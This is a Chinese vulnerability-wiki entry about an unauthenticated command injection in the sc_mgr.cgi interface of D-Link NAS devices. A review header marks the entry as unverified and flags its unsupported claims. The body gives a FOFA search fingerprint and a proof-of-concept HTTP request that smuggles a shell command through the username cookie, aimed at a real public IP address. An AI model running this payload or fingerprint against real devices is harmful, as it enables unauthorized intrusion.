---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-f3d26105402601077d95ed61"
entity_id: "ve-f3d26105402601077d95ed61"
schema_version: "1"
fofa_unverified: "body="
title: "D-Link NAS设备 sc_mgr.cgi 未授权RCE漏洞"
product: "D-Link NAS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无型号固件，声称未认证"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/D-Link/D-Link%20NAS%E8%AE%BE%E5%A4%87%20sc_mgr.cgi%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
---

# D-Link NAS设备 sc_mgr.cgi 未授权RCE漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：D-Link NAS
- 本文讨论：sc_mgr.cgi Cookie username命令注入
- 版本、权限与配置前提：无型号固件，声称未认证
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 示例留真实公网Host，宜文档占位替换
- fofa元数据body=残缺；无CVE/原始来源
- 4万资产及在野利用无证据；未知EOL却泛称等待补丁
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 漏洞编号、版本、Cookie注入及补丁待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

D-Link NAS设备 /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info 接口存在远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。

# 影响版本

D-Link NAS设备

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/cgi-bin/login_mgr.cgi"  &&  body="cmd=cgi_get_ssl_info"

POC/EXP：

GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
Host: 81.98.246.72
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Cookie: username=mopfdfsewo'& ifconfig & echo 'mopfdfsewo;

![image-20241119211127581](./.resource/D-LinkNAS设备sc_mgr.cgi未授权RCE漏洞/media/image-20241119211127581.png)


影响独立ip资产4w+

![image-20241119211252800](./.resource/D-LinkNAS设备sc_mgr.cgi未授权RCE漏洞/media/image-20241119211252800.png)


# 漏洞修复

应用补丁和更新： 用户应下载并安装 D-Link 提供的任何固件更新。

限制网络访问： 作为临时措施，对 NAS 管理界面的网络访问应仅限于受信任的 IP 地址。

监控固件更新： 受影响的设备用户应密切关注 D-Link 即将提供的任何安全补丁。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
